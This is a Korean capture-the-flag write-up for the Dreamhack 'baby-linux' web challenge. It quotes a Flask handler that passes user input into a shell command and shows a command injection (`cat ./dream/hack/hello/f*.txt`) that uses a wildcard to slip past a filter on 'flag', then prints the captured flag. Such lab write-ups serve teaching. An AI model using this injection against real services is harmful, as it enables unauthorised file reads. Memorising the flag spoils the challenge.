# 837_baby-linux

- 문제 링크: [Dreamhack 837_baby-linux](https://dreamhack.io/wargame/challenges/837/)
- 분류: 웹 해킹
- 난이도: B3

## 풀이

### 소스 분석

`app.py`는 POST 요청으로 전달된 `user_input`을 별도의 검증이나 이스케이프 없이 셸 명령에 삽입합니다.

```python
user_input = request.form.get('user_input')
cmd = f'echo $({user_input})'
if 'flag' in cmd:
    return render_template('index.html', result='No!')

output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
```

사용자 입력은 `echo $(...)` 안에서 실행되므로 명령어 주입이 가능합니다. 다만 실행 전에 `cmd` 문자열에 `flag`가 포함되어 있는지 검사합니다.

이 검사는 셸이 명령을 해석하기 전의 문자열에 대해서만 수행됩니다. 따라서 `*`와 같은 wildcard를 사용하면 검사 시점에는 `flag`라는 문자열이 없지만, 셸 실행 시 실제 파일명으로 확장됩니다.

### flag 경로 확인

서비스의 현재 작업 디렉터리는 `/app`입니다. `hint.txt`에는 다음 내용이 있습니다.

```text
Where is Flag? ./dream/hack/hello
```

실제 flag 파일 경로는 다음과 같습니다.

```text
/app/dream/hack/hello/flag.txt
```

따라서 단순히 `cat f*`를 입력하면 `/app` 바로 아래에서만 파일을 찾기 때문에 flag를 읽지 못합니다.

### 우회 입력

다음 입력을 사용합니다.

```text
cat ./dream/hack/hello/f*.txt
```

서버에서 만들어지는 명령은 다음과 같습니다.

```sh
echo $(cat ./dream/hack/hello/f*.txt)
```

이 문자열에는 `flag`가 없으므로 필터를 통과합니다. 이후 `/bin/sh`가 `f*.txt`를 `flag.txt`로 확장하여 다음 파일을 읽습니다.

```sh
cat ./dream/hack/hello/flag.txt
```

`cat ./dream/hack/hello/f*`도 같은 방식으로 동작합니다.

## 실행 결과

```text
DH{671ce26c70829e716fae26c7c71a33823feb479f2562891f64605bf68f60ae54}
```
